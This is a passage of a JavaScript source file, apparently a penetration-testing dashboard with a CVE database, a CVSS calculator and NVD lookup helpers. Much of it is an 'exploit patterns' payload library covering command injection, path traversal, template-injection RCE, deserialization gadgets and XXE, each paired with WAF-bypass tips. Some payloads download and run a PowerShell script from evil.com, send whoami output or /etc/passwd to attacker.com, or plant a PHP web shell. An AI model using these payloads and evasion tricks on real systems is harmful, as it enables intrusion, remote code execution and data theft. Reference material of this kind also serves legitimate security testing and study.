    { name: 'Pipe Chain', payload: '| id', desc: 'Pipe output to command.', where: 'Unix/Linux systems', waf: 'Try: || id (OR operator)' },
    { name: 'Ampersand Chain', payload: '& id', desc: 'Background command execution.', where: 'Unix/Linux systems', waf: 'Try: && id (AND operator)' },
    { name: 'Backtick Substitution', payload: '`id`', desc: 'Command substitution via backticks.', where: 'Unix/Linux systems', waf: 'Try: $(id) as alternative' },
    { name: 'Dollar Substitution', payload: '$(id)', desc: 'Modern command substitution.', where: 'Unix/Linux systems', waf: 'Preferred over backticks' },
    { name: 'Newline Injection', payload: '%0aid', desc: 'Newline character to inject command.', where: 'URL parameters, HTTP headers', waf: 'Also try: %0d%0a' },
    { name: 'PowerShell (IEX)', payload: '; IEX(New-Object Net.WebClient).DownloadString("http://evil.com/shell.ps1")', desc: 'PowerShell download and execute.', where: 'Windows systems', waf: 'Try: powershell -enc <base64>' },
    { name: 'PowerShell (Direct)', payload: '& powershell -c "whoami"', desc: 'Direct PowerShell command execution.', where: 'Windows systems', waf: 'Try: cmd /c whoami' },
    { name: 'Blind (Sleep)', payload: '; sleep 10', desc: 'Time-based blind command injection detection.', where: 'No output reflection', waf: 'Try: & ping -c 10 127.0.0.1' },
    { name: 'Blind (DNS)', payload: '; nslookup $(whoami).attacker.com', desc: 'Exfiltrate via DNS lookup.', where: 'Blind — outbound DNS allowed', waf: 'Use Burp Collaborator or interactsh' },
    { name: 'Blind (Curl)', payload: '; curl http://attacker.com/$(whoami)', desc: 'Exfiltrate via HTTP callback.', where: 'Blind — outbound HTTP allowed', waf: 'Try: wget as alternative' },
    { name: 'WAF Bypass (Quotes)', payload: "w'h'o'a'm'i", desc: 'Quote insertion between characters.', where: 'Keyword-filtering WAFs', waf: 'Bash ignores quotes within words' },
    { name: 'WAF Bypass ($IFS)', payload: 'cat${IFS}/etc/passwd', desc: 'Use $IFS as space alternative.', where: 'Space-filtered inputs', waf: 'Also try: cat$IFS$9/etc/passwd, {cat,/etc/passwd}' },
    { name: 'WAF Bypass (Var)', payload: 'a]b]c]d]e]f=whoami;$a]b]c]d]e]f', desc: 'Store command in variable.', where: 'Advanced WAF bypass', waf: 'Obfuscate the command name itself' },
    { name: 'Windows (CMD)', payload: '& type C:\\Windows\\win.ini', desc: 'Windows command injection to read file.', where: 'Windows systems', waf: 'Try: & type C:\\Windows\\System32\\drivers\\etc\\hosts' },
  ],
  'Path Traversal': [
    { name: 'Basic Unix', payload: '../../../etc/passwd', desc: 'Classic Unix path traversal.', where: 'File read/include parameters', waf: 'Try varying depth: ../../, ../../../../' },
    { name: 'Basic Windows', payload: '..\\..\\..\\windows\\win.ini', desc: 'Windows backslash traversal.', where: 'Windows file operations', waf: 'Try: ..\\..\\..\\windows\\system32\\drivers\\etc\\hosts' },
    { name: 'URL Encoded', payload: '..%2f..%2f..%2fetc%2fpasswd', desc: 'URL encode the traversal characters.', where: 'WAF-protected endpoints', waf: 'Single-pass URL decoding' },
    { name: 'Double Encoded', payload: '..%252f..%252f..%252fetc%252fpasswd', desc: 'Double URL encoding bypass.', where: 'Dual-decode endpoints', waf: 'Bypasses single-decode WAFs' },
    { name: 'Null Byte (Legacy)', payload: '../../../etc/passwd%00.jpg', desc: 'Null byte to truncate extension check (old PHP).', where: 'PHP < 5.3.4, old languages', waf: 'Only works in legacy systems' },
    { name: 'UTF-8 Encoding', payload: '..%c0%af..%c0%af..%c0%afetc/passwd', desc: 'UTF-8 overlong encoding of /.', where: 'Servers with UTF-8 normalization issues', waf: 'Also try: %c1%9c for backslash' },
    { name: 'Dot Truncation', payload: '../../../etc/passwd..........................................................', desc: 'Long filename with dots to exceed path length.', where: 'Windows (MAX_PATH bypass)', waf: 'Windows specific — exceeds MAX_PATH' },
    { name: 'Absolute Path', payload: '/etc/passwd', desc: 'Direct absolute path if no traversal check.', where: 'Misconfigured file parameters', waf: 'Try: file:///etc/passwd' },
    { name: 'PHP Wrapper (Filter)', payload: 'php://filter/convert.base64-encode/resource=config.php', desc: 'Read PHP source via filter wrapper.', where: 'PHP LFI (include/require)', waf: 'Outputs base64 of source code' },
    { name: 'PHP Wrapper (Data)', payload: "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==", desc: 'Execute code via data wrapper.', where: 'PHP LFI with allow_url_include=On', waf: 'Base64 of <?php system($_GET["c"]); ?>' },
    { name: 'PHP Wrapper (Input)', payload: 'php://input (POST body: <?php system("id"); ?>)', desc: 'Execute code from request body.', where: 'PHP LFI with allow_url_include=On', waf: 'Send PHP code in POST body' },
    { name: 'Log Poisoning', payload: 'Include /var/log/apache2/access.log after sending User-Agent: <?php system($_GET["c"]); ?>', desc: 'Inject PHP into logs, then include the log file.', where: 'LFI + web server log access', waf: 'Requires write to readable log file' },
    { name: 'Proc Self', payload: '/proc/self/environ', desc: 'Read process environment variables.', where: 'Linux LFI', waf: 'May contain HTTP headers → inject PHP in User-Agent' },
    { name: 'Windows UNC', payload: '\\\\attacker\\share\\payload', desc: 'UNC path for SMB exfiltration/execution.', where: 'Windows file operations', waf: 'Captures NTLMv2 hash or loads remote file' },
    { name: 'Bypass (Filter Strip)', payload: '....//....//....//etc/passwd', desc: 'If ../ is stripped once, extra chars survive.', where: 'Single-pass sanitization', waf: 'Also try: ..././..././' },
  ],
  'SSTI (Server-Side Template Injection)': [
    { name: 'Detection (Math)', payload: '{{7*7}}', desc: 'If output shows 49, template injection exists.', where: 'Template-rendered user input', waf: 'Universal detection probe' },
    { name: 'Detection (String)', payload: '{{7*\'7\'}}', desc: 'If output shows 7777777, likely Jinja2. If 49, likely Twig.', where: 'Template detection', waf: 'Differentiates template engines' },
    { name: 'Jinja2 RCE', payload: "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}", desc: 'Python Jinja2 RCE via subprocess.', where: 'Flask/Jinja2 applications', waf: 'Subclass index may vary — enumerate first' },
    { name: 'Jinja2 Config', payload: "{{config.items()}}", desc: 'Dump Flask config including SECRET_KEY.', where: 'Flask applications', waf: 'Try: {{config.__class__.__init__.__globals__}}' },
    { name: 'Jinja2 (OS Import)', payload: "{{cycler.__init__.__globals__.os.popen('id').read()}}", desc: 'Jinja2 RCE via cycler global os import.', where: 'Flask/Jinja2', waf: 'Also: lipsum.__globals__.os.popen' },
    { name: 'Twig RCE', payload: '{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}', desc: 'PHP Twig RCE via filter callback.', where: 'Symfony/Twig applications', waf: 'Twig 1.x only' },
    { name: 'Twig (system)', payload: '{{["id"]|filter("system")}}', desc: 'Twig 2.x/3.x RCE via filter function.', where: 'Twig 2.x/3.x', waf: 'Also try: {{["id"]|map("system")}}' },
    { name: 'FreeMarker RCE', payload: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}', desc: 'Java FreeMarker RCE via Execute class.', where: 'Java applications with FreeMarker', waf: 'Check for FreeMarker version restrictions' },
    { name: 'Velocity RCE', payload: '#set($e="")#set($rt=$e.class.forName("java.lang.Runtime"))#set($chr=$e.class.forName("java.lang.Character"))#set($str=$e.class.forName("java.lang.String"))#set($ex=$rt.getRuntime().exec("id"))', desc: 'Java Velocity template RCE.', where: 'Java Velocity templates', waf: 'Solr, Confluence, and other Java apps' },
    { name: 'Pebble RCE', payload: '{% set cmd = "id" %}{% set bytes = (1).TYPE.forName("java.lang.Runtime").methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}{{(1).TYPE.forName("java.lang.String").constructors[0].newInstance(([bytes],"UTF-8"))}}', desc: 'Java Pebble template engine RCE.', where: 'Java applications with Pebble', waf: 'Complex but effective' },
    { name: 'Smarty RCE', payload: '{system("id")}', desc: 'PHP Smarty template RCE.', where: 'PHP Smarty template apps', waf: 'Try: {php}system("id");{/php}' },
    { name: 'ERB RCE', payload: '<%= system("id") %>', desc: 'Ruby ERB template RCE.', where: 'Ruby on Rails ERB templates', waf: 'Also try: <%= `id` %>' },
    { name: 'Mako RCE', payload: '${__import__("os").popen("id").read()}', desc: 'Python Mako template RCE.', where: 'Python Mako template applications', waf: 'Direct Python import execution' },
    { name: 'Handlebars Prototype', payload: '{{#with "s" as |string|}}\n  {{#with "e"}}{{#with split as |conslist|}}\n    {{this.pop}}\n    {{this.push (lookup string.sub "constructor")}}\n    {{this.pop}}\n    {{#with string.split as |codelist|}}\n      {{this.pop}}\n      {{this.push "return require(\'child_process\').execSync(\'id\');"}}\n      {{this.pop}}\n      {{#each conslist}}\n        {{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}\n      {{/each}}\n    {{/with}}\n  {{/with}}\n{{/with}}\n{{/with}}', desc: 'Handlebars.js prototype pollution to RCE.', where: 'Node.js Handlebars applications', waf: 'Requires specific Handlebars versions' },
    { name: 'Nunjucks RCE', payload: "{{range.constructor('return global.process.mainModule.require(\\'child_process\\').execSync(\\'id\\')')()}}", desc: 'Nunjucks SSTI RCE via constructor.', where: 'Node.js Nunjucks apps', waf: 'Also try: {{constructor.constructor("return this.process.mainModule.require(\'child_process\').execSync(\'id\')")()}}' },
  ],
  'Deserialization': [
    { name: 'Java (CommonsCollections)', payload: 'java -jar ysoserial.jar CommonsCollections1 "id" | base64', desc: 'Java deserialization with ysoserial using CommonsCollections gadget chain.', where: 'Java apps with CC in classpath', waf: 'Try multiple chains: CC1-CC7, CommonsCollections' },
    { name: 'Java (Detection)', payload: 'Magic bytes: AC ED 00 05 (binary) or rO0AB (base64)', desc: 'Detect Java serialized objects in traffic/cookies.', where: 'Any Java application', waf: 'Check cookies, POST data, custom headers' },
    { name: 'PHP unserialize', payload: 'O:8:"Classname":1:{s:4:"prop";s:10:"os_command";}', desc: 'PHP object injection via unserialize().', where: 'PHP apps using unserialize on user input', waf: 'Use phpggc for gadget chains' },
    { name: 'PHP POP Chain', payload: 'phpggc Laravel/RCE1 system "id" | base64', desc: 'Generate PHP gadget chain with phpggc tool.', where: 'PHP frameworks (Laravel, Symfony, etc.)', waf: 'Multiple chains per framework' },
    { name: 'Python Pickle', payload: "import pickle, os\nclass Exploit:\n    def __reduce__(self):\n        return (os.system, ('id',))\npickle.dumps(Exploit())", desc: 'Python pickle deserialization RCE.', where: 'Python apps using pickle.loads on user input', waf: 'Base64 encode the pickle bytes' },
    { name: '.NET (ViewState)', payload: 'ysoserial.net -g TypeConfuseDelegate -f ObjectStateFormatter -c "id" --validationalg="SHA1" --validationkey="<key>"', desc: '.NET ViewState deserialization with known keys.', where: '.NET applications with ViewState', waf: 'Requires knowledge of machineKey values' },
    { name: '.NET (BinaryFormatter)', payload: 'ysoserial.net -g WindowsIdentity -f BinaryFormatter -c "id"', desc: '.NET BinaryFormatter deserialization RCE.', where: '.NET apps using BinaryFormatter', waf: 'Multiple formatters available' },
    { name: 'Ruby (Marshal)', payload: "payload = Marshal.dump(ERBTemplate.new('<%= `id` %>'))", desc: 'Ruby Marshal deserialization for RCE.', where: 'Ruby apps using Marshal.load on user input', waf: 'Check for YAML deserialization too' },
    { name: 'YAML (Ruby)', payload: "--- !ruby/object:Gem::Installer\ni: x\n--- !ruby/object:Gem::SpecFetcher\ni: y\n--- !ruby/object:Gem::Requirement\nrequirements:\n  !ruby/object:Gem::DependencyList\n  specs:\n  - !ruby/object:Gem::Source\n    uri: '| id'", desc: 'Ruby YAML deserialization RCE.', where: 'Ruby apps using YAML.load (not safe_load)', waf: 'YAML.load is unsafe, YAML.safe_load is not' },
    { name: 'Node.js (node-serialize)', payload: '{"cmd":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\', function(error, stdout, stderr){console.log(stdout)});}()"}', desc: 'Node.js node-serialize library RCE.', where: 'Node.js apps using node-serialize', waf: 'IIFE pattern in serialized function' },
  ],
  'XXE (XML External Entity)': [
    { name: 'Basic File Read', payload: '<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<foo>&xxe;</foo>', desc: 'Read local files via external entity.', where: 'XML parsing endpoints', waf: 'Change file path for Windows: file:///C:/Windows/win.ini' },
    { name: 'SSRF via XXE', payload: '<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "http://internal-server/api">\n]>\n<foo>&xxe;</foo>', desc: 'Make HTTP requests to internal services.', where: 'XML parsing with network access', waf: 'Use for internal port scanning' },
    { name: 'Blind XXE (OOB)', payload: '<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">\n  %xxe;\n]>\n<foo>data</foo>\n\n--- evil.dtd ---\n<!ENTITY % file SYSTEM "file:///etc/passwd">\n<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://attacker.com/?x=%file;\'>">\n%eval;\n%exfil;', desc: 'Exfiltrate file contents out-of-band via external DTD.', where: 'Blind XXE (no output reflection)', waf: 'Requires attacker-controlled DTD server' },
    { name: 'Parameter Entity', payload: '<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">\n  %xxe;\n]>', desc: 'Load external DTD with parameter entities.', where: 'XML parsers allowing external DTD', waf: 'Parameter entities use % instead of &' },
    { name: 'PHP Wrapper XXE', payload: '<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">\n]>\n<foo>&xxe;</foo>', desc: 'Read files via PHP filter wrapper (base64).', where: 'PHP XML parsing', waf: 'Avoids XML parsing errors with binary files' },
    { name: 'Billion Laughs (DoS)', payload: '<?xml version="1.0"?>\n<!DOCTYPE lolz [\n  <!ENTITY lol "lol">\n  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">\n  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">\n]>\n<lolz>&lol3;</lolz>', desc: 'XML bomb causing exponential entity expansion (DoS).', where: 'Any XML parser without expansion limits', waf: 'Causes memory exhaustion' },
    { name: 'SVG XXE', payload: '<svg xmlns="http://www.w3.org/2000/svg">\n  <foreignObject>\n    <![CDATA[<?xml version="1.0"?>\n    <!DOCTYPE foo [\n      <!ENTITY xxe SYSTEM "file:///etc/passwd">\n    ]>\n    <foo>&xxe;</foo>]]>\n  </foreignObject>\n</svg>', desc: 'XXE via SVG file upload.', where: 'Image upload accepting SVG', waf: 'Upload as .svg file' },
    { name: 'Office Doc XXE', payload: 'Modify [Content_Types].xml inside .docx/.xlsx:\n<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "http://attacker.com/?data=xxe">\n]>\n<Types>&xxe;</Types>', desc: 'XXE through crafted Office documents.', where: 'Document upload/processing', waf: 'Office files are ZIP archives with XML' },
    { name: 'SOAP XXE', payload: '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<soapenv:Body>\n  <data>&xxe;</data>\n</soapenv:Body>\n</soapenv:Envelope>', desc: 'XXE in SOAP web services.', where: 'SOAP/XML-RPC endpoints', waf: 'SOAP often has XML parsing enabled' },
    { name: 'XInclude', payload: '<foo xmlns:xi="http://www.w3.org/2001/XInclude">\n  <xi:include parse="text" href="file:///etc/passwd"/>\n</foo>', desc: 'XInclude to include files when you cannot control the full XML.', where: 'Partial XML control (e.g., SOAP body)', waf: 'Useful when you cannot define DOCTYPE' },
  ],
};


// ═══════════════════════════════════════════════════════════════
//  CVSS v3.1 CALCULATOR
// ═══════════════════════════════════════════════════════════════
const CVSS_METRICS = {
  AV: { name: 'Attack Vector', options: [{ label: 'Network', value: 'N', weight: 0.85 }, { label: 'Adjacent', value: 'A', weight: 0.62 }, { label: 'Local', value: 'L', weight: 0.55 }, { label: 'Physical', value: 'P', weight: 0.20 }] },
  AC: { name: 'Attack Complexity', options: [{ label: 'Low', value: 'L', weight: 0.77 }, { label: 'High', value: 'H', weight: 0.44 }] },
  PR: { name: 'Privileges Required', options: [{ label: 'None', value: 'N', weight: { U: 0.85, C: 0.85 } }, { label: 'Low', value: 'L', weight: { U: 0.62, C: 0.68 } }, { label: 'High', value: 'H', weight: { U: 0.27, C: 0.50 } }] },
  UI: { name: 'User Interaction', options: [{ label: 'None', value: 'N', weight: 0.85 }, { label: 'Required', value: 'R', weight: 0.62 }] },
  S:  { name: 'Scope', options: [{ label: 'Unchanged', value: 'U' }, { label: 'Changed', value: 'C' }] },
  C:  { name: 'Confidentiality', options: [{ label: 'None', value: 'N', weight: 0 }, { label: 'Low', value: 'L', weight: 0.22 }, { label: 'High', value: 'H', weight: 0.56 }] },
  I:  { name: 'Integrity', options: [{ label: 'None', value: 'N', weight: 0 }, { label: 'Low', value: 'L', weight: 0.22 }, { label: 'High', value: 'H', weight: 0.56 }] },
  A:  { name: 'Availability', options: [{ label: 'None', value: 'N', weight: 0 }, { label: 'Low', value: 'L', weight: 0.22 }, { label: 'High', value: 'H', weight: 0.56 }] },
};

function roundUp(val) {
  return Math.ceil(val * 10) / 10;
}

function calcCVSS(metrics) {
  const { AV, AC, PR, UI, S, C, I, A } = metrics;
  if (!AV || !AC || !PR || !UI || !S || !C || !I || !A) return null;

  const avW = CVSS_METRICS.AV.options.find(o => o.value === AV).weight;
  const acW = CVSS_METRICS.AC.options.find(o => o.value === AC).weight;
  const prOpt = CVSS_METRICS.PR.options.find(o => o.value === PR);
  const prW = prOpt.weight[S];
  const uiW = CVSS_METRICS.UI.options.find(o => o.value === UI).weight;
  const cW = CVSS_METRICS.C.options.find(o => o.value === C).weight;
  const iW = CVSS_METRICS.I.options.find(o => o.value === I).weight;
  const aW = CVSS_METRICS.A.options.find(o => o.value === A).weight;

  const iss = 1 - ((1 - cW) * (1 - iW) * (1 - aW));
  let impact;
  if (S === 'U') {
    impact = 6.42 * iss;
  } else {
    impact = 7.52 * (iss - 0.029) - 3.25 * Math.pow(iss - 0.02, 15);
  }

  const exploitability = 8.22 * avW * acW * prW * uiW;

  if (impact <= 0) return { score: 0, severity: 'None', impact, exploitability, iss };

  let score;
  if (S === 'U') {
    score = roundUp(Math.min(impact + exploitability, 10));
  } else {
    score = roundUp(Math.min(1.08 * (impact + exploitability), 10));
  }

  let severity = 'None';
  if (score >= 9.0) severity = 'Critical';
  else if (score >= 7.0) severity = 'High';
  else if (score >= 4.0) severity = 'Medium';
  else if (score >= 0.1) severity = 'Low';

  return { score, severity, impact: Math.round(impact * 100) / 100, exploitability: Math.round(exploitability * 100) / 100, iss: Math.round(iss * 1000) / 1000 };
}


// ═══════════════════════════════════════════════════════════════
//  TECH STACK FOR ADVISOR
// ═══════════════════════════════════════════════════════════════
const TECH_CATEGORIES = {
  'Web Servers': ['Apache', 'Nginx', 'IIS', 'Tomcat', 'LiteSpeed'],
  'Languages / Frameworks': ['PHP', 'Java', 'Python', 'Node.js', '.NET', 'Ruby', 'Go'],
  'CMS': ['WordPress', 'Joomla', 'Drupal', 'Magento', 'Shopify'],
  'Databases': ['MySQL', 'PostgreSQL', 'MongoDB', 'MSSQL', 'Redis', 'Elasticsearch'],
  'OS': ['Linux', 'Windows', 'macOS'],
  'Cloud / Container': ['AWS', 'Azure', 'GCP', 'Docker', 'Kubernetes'],
  'Mail': ['Exchange', 'Postfix', 'Dovecot'],
  'Other': ['Apache Struts', 'Spring', 'Log4j', 'Jenkins', 'GitLab', 'Confluence', 'Jira', 'WebLogic', 'Samba', 'OpenSSH', 'F5 BIG-IP', 'Fortinet', 'Cisco'],
};

const TECH_CVE_MAP = {
  'Apache': ['apache', 'httpd', 'struts', 'mod_proxy'],
  'Nginx': ['nginx'],
  'IIS': ['iis', 'asp.net', 'microsoft'],
  'Tomcat': ['tomcat', 'java'],
  'PHP': ['php', 'drupal', 'wordpress', 'joomla', 'laravel', 'cms'],
  'Java': ['java', 'log4j', 'spring', 'struts', 'weblogic', 'jboss', 'tomcat', 'jackson', 'shiro', 'deserialization'],
  'Python': ['python', 'pickle', 'django', 'flask'],
  'Node.js': ['nodejs', 'npm', 'javascript', 'ejs', 'express', 'lodash', 'jquery', 'prototype-pollution'],
  '.NET': ['dotnet', 'asp.net', 'microsoft', 'sharepoint', 'viewstate'],
  'Ruby': ['ruby', 'rails', 'activerecord'],
  'WordPress': ['wordpress', 'php', 'cms', 'plugin', 'wp-query'],
  'Joomla': ['joomla', 'php', 'cms'],
  'Drupal': ['drupal', 'php', 'cms', 'form-api'],
  'MySQL': ['mysql', 'mariadb', 'database', 'sql-injection'],
  'PostgreSQL': ['postgresql', 'database', 'sql-injection'],
  'MongoDB': ['mongodb', 'nosql', 'bson'],
  'MSSQL': ['mssql', 'microsoft', 'database'],
  'Linux': ['linux', 'kernel', 'sudo', 'bash', 'polkit', 'pkexec', 'samba', 'openssh', 'netfilter', 'nftables', 'glibc'],
  'Windows': ['windows', 'smb', 'rdp', 'active-directory', 'print-spooler', 'exchange', 'msdt', 'office', 'ntlm', 'kerberos'],
  'Exchange': ['exchange', 'microsoft', 'proxylogon', 'proxyshell', 'proxynotshell', 'outlook'],
  'Apache Struts': ['struts', 'ognl'],
  'Spring': ['spring', 'java', 'spel'],
  'Log4j': ['log4j', 'jndi', 'logging'],
  'Jenkins': ['jenkins', 'java', 'ci-cd'],
  'GitLab': ['gitlab', 'exiftool'],
  'Confluence': ['confluence', 'atlassian', 'ognl'],
  'WebLogic': ['weblogic', 'oracle', 'java', 't3', 'iiop'],
  'Samba': ['samba', 'smb'],
  'OpenSSH': ['openssh', 'ssh'],
  'F5 BIG-IP': ['f5', 'bigip'],
  'Fortinet': ['fortinet', 'vpn', 'fortios'],
  'Cisco': ['cisco', 'asa', 'ios-xe'],
  'Docker': ['docker', 'container-escape'],
  'Kubernetes': ['kubernetes', 'k8s'],
};


// ═══════════════════════════════════════════════════════════════
//  STYLES
// ═══════════════════════════════════════════════════════════════
const s = {
  page: { padding: '24px 28px', maxWidth: 1200, margin: '0 auto' },
  headerRow: { display: 'flex', alignItems: 'center', gap: 14, marginBottom: 24 },
  iconBox: { width: 36, height: 36, borderRadius: 10, background: `${accent}18`, display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 },
  title: { fontFamily: heading, fontSize: 22, fontWeight: 700, color: '#E2E8F0', margin: 0 },
  tabRow: { display: 'flex', gap: 4, marginBottom: 24, borderBottom: '1px solid rgba(255,255,255,0.06)', paddingBottom: 0 },
  tab: (active) => ({ fontFamily: heading, fontSize: 13, fontWeight: 600, padding: '10px 18px', cursor: 'pointer', border: 'none', borderBottom: active ? `2px solid ${accent}` : '2px solid transparent', background: 'none', color: active ? accent : '#94A3B8', transition: 'all 0.15s', borderRadius: '6px 6px 0 0' }),
  searchRow: { display: 'flex', gap: 10, marginBottom: 16, flexWrap: 'wrap', alignItems: 'center' },
  searchInput: { flex: 1, minWidth: 260, background: '#0B0F18', border: '1px solid rgba(255,255,255,0.08)', borderRadius: 8, padding: '10px 14px 10px 38px', color: '#E2E8F0', fontSize: 13, fontFamily: mono, outline: 'none' },
  filterChip: (active) => ({ padding: '5px 12px', borderRadius: 16, border: `1px solid ${active ? accent : 'rgba(255,255,255,0.1)'}`, background: active ? `${accent}20` : 'transparent', color: active ? accent : '#94A3B8', fontSize: 11, fontFamily: mono, fontWeight: 500, cursor: 'pointer', transition: 'all 0.15s', whiteSpace: 'nowrap' }),
  resultCount: { fontFamily: mono, fontSize: 11, color: '#64748B', marginBottom: 14 },
  cveCard: { background: '#0D1117', border: '1px solid rgba(255,255,255,0.05)', borderRadius: 10, marginBottom: 8, cursor: 'pointer', transition: 'border-color 0.15s' },
  cveHeader: { display: 'flex', alignItems: 'center', gap: 12, padding: '14px 18px', flexWrap: 'wrap' },
  cveId: { fontFamily: mono, fontSize: 13, fontWeight: 700, color: accent },
  cveName: { fontFamily: heading, fontSize: 14, fontWeight: 600, color: '#E2E8F0' },
  badge: (color) => ({ padding: '2px 8px', borderRadius: 10, fontSize: 10, fontWeight: 700, fontFamily: mono, color: '#fff', background: color }),
  cvssScore: { fontFamily: mono, fontSize: 12, fontWeight: 700, padding: '3px 8px', borderRadius: 6, background: 'rgba(255,255,255,0.06)', color: '#E2E8F0' },
  pill: { padding: '2px 8px', borderRadius: 10, fontSize: 10, fontFamily: mono, fontWeight: 500, background: 'rgba(255,255,255,0.06)', color: '#94A3B8' },
  expandedBody: { padding: '0 18px 18px', borderTop: '1px solid rgba(255,255,255,0.04)' },
  desc: { fontFamily: mono, fontSize: 12, color: '#CBD5E1', lineHeight: 1.7, margin: '14px 0' },
  codeBlock: { background: '#0B0F18', border: '1px solid rgba(255,255,255,0.06)', borderRadius: 8, padding: '14px 16px', fontFamily: mono, fontSize: 11, color: '#FB7185', whiteSpace: 'pre-wrap', wordBreak: 'break-all', lineHeight: 1.6, position: 'relative', marginBottom: 12 },
  mitigationBox: { borderLeft: '3px solid #4ADE80', background: 'rgba(74,222,128,0.04)', borderRadius: '0 8px 8px 0', padding: '12px 16px', marginBottom: 12 },
  mitigationText: { fontFamily: mono, fontSize: 11, color: '#86EFAC', lineHeight: 1.6 },
  tagSmall: { display: 'inline-block', padding: '1px 6px', borderRadius: 8, fontSize: 9, fontFamily: mono, background: 'rgba(255,255,255,0.04)', color: '#64748B', marginRight: 4, marginBottom: 4 },
  link: { color: accent, fontSize: 11, fontFamily: mono, textDecoration: 'none' },
  selectBox: { background: '#0B0F18', border: '1px solid rgba(255,255,255,0.08)', borderRadius: 8, padding: '6px 10px', color: '#E2E8F0', fontSize: 11, fontFamily: mono, outline: 'none', cursor: 'pointer' },
  sortBtn: (active) => ({ display: 'flex', alignItems: 'center', gap: 4, padding: '5px 10px', borderRadius: 8, border: `1px solid ${active ? accent : 'rgba(255,255,255,0.08)'}`, background: active ? `${accent}15` : 'transparent', color: active ? accent : '#94A3B8', fontSize: 11, fontFamily: mono, cursor: 'pointer', whiteSpace: 'nowrap' }),
  metricGroup: { marginBottom: 20 },
  metricLabel: { fontFamily: heading, fontSize: 13, fontWeight: 600, color: '#CBD5E1', marginBottom: 8 },
  metricBtn: (active) => ({ padding: '8px 16px', borderRadius: 8, border: `1px solid ${active ? accent : 'rgba(255,255,255,0.1)'}`, background: active ? `${accent}20` : '#0D1117', color: active ? accent : '#94A3B8', fontSize: 12, fontFamily: mono, fontWeight: 600, cursor: 'pointer', transition: 'all 0.15s' }),
  bigScore: (color) => ({ fontFamily: mono, fontSize: 56, fontWeight: 800, color, lineHeight: 1 }),
  vectorString: { fontFamily: mono, fontSize: 12, color: '#94A3B8', background: '#0B0F18', padding: '10px 14px', borderRadius: 8, border: '1px solid rgba(255,255,255,0.06)', display: 'flex', alignItems: 'center', gap: 10, justifyContent: 'space-between', marginTop: 12 },
  advChip: (active) => ({ padding: '6px 14px', borderRadius: 8, border: `1px solid ${active ? accent : 'rgba(255,255,255,0.08)'}`, background: active ? `${accent}18` : '#0D1117', color: active ? '#E2E8F0' : '#94A3B8', fontSize: 12, fontFamily: mono, cursor: 'pointer', transition: 'all 0.15s' }),
  sectionTitle: { fontFamily: heading, fontSize: 15, fontWeight: 700, color: '#E2E8F0', marginBottom: 10, marginTop: 20, display: 'flex', alignItems: 'center', gap: 8 },
  patternCard: { background: '#0D1117', border: '1px solid rgba(255,255,255,0.05)', borderRadius: 8, padding: '14px 16px', marginBottom: 6 },
  patternName: { fontFamily: heading, fontSize: 13, fontWeight: 600, color: '#E2E8F0', marginBottom: 4 },
  patternDesc: { fontFamily: mono, fontSize: 11, color: '#94A3B8', lineHeight: 1.5 },
  patternMeta: { fontFamily: mono, fontSize: 10, color: '#64748B', marginTop: 6, lineHeight: 1.5 },
};

const SEV_COLORS = { Critical: '#EF4444', High: '#F97316', Medium: '#EAB308', Low: '#22C55E' };

const NVD_API_BASE = 'https://services.nvd.nist.gov/rest/json/cves/2.0';
const NVD_CVE_ID_PATTERN = /^CVE-\d{4}-\d{4,}$/i;

function nvdExtractCvss(cve) {
  const m = cve?.metrics;
  if (!m) return null;
  const s31 = m.cvssMetricV31?.[0]?.cvssData?.baseScore;
  if (s31 != null && !Number.isNaN(Number(s31))) return Number(s31);
  const s30 = m.cvssMetricV30?.[0]?.cvssData?.baseScore;
  if (s30 != null && !Number.isNaN(Number(s30))) return Number(s30);
  const s2 = m.cvssMetricV2?.[0]?.cvssData?.baseScore;
  if (s2 != null && !Number.isNaN(Number(s2))) return Number(s2);
  return null;
}

function nvdLiveSeverityBand(score) {
  if (score == null || Number.isNaN(score)) {
    return { label: 'N/A', bg: '#475569', color: '#E2E8F0' };
  }
  if (score >= 9) return { label: 'Critical', bg: '#DC2626', color: '#fff' };
  if (score >= 7) return { label: 'High', bg: '#EA580C', color: '#fff' };
  if (score >= 4) return { label: 'Medium', bg: '#CA8A04', color: '#0f172a' };
  return { label: 'Low', bg: '#16A34A', color: '#fff' };
}

function nvdParseDescription(cve) {
  const d = cve?.descriptions?.find((x) => x.lang === 'en') || cve?.descriptions?.[0];
  return d?.value || 'No description available.';
}

function nvdParseRefs(cve) {
  const refs = cve?.references;
  if (!Array.isArray(refs)) return [];
  return refs.map((r) => r.url).filter(Boolean);
}

const CATEGORIES = [...new Set(CVE_DATABASE.map(c => c.category))].sort();
const PLATFORMS = [...new Set(CVE_DATABASE.map(c => c.platform))].sort();
const YEARS = [...new Set(CVE_DATABASE.map(c => c.published.slice(0, 4)))].sort().reverse();

const TABS = [
  { id: 'database', label: 'CVE Database', icon: Database },
  { id: 'advisor', label: 'Vuln Advisor', icon: Target },
  { id: 'patterns', label: 'Exploit Patterns', icon: Code },
